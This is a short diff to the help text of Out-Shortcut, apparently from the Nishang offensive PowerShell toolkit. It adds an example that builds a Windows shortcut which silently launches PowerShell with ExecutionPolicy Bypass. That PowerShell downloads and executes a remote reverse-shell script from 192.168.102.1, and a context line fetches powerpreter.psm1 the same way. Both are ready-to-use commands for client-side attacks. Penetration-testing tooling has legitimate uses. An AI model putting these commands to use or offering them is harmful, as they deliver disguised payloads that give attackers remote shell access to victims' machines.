@@ -63,6 +63,11 @@ PS > Out-Shortcut -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments C
 
 Use above command to assign notepad icon to the generated shortcut.
 
+.EXAMPLE
+PS > Out-Shortcut -Executable C:\Windows\System32\cmd.exe -Payload " /c powershell -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.102.1/Invoke-PowerShellTcpOneLine.ps1'))"
+
+Use above command to use a custom executable and payload.
+
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
 https://github.com/samratashok/nishang
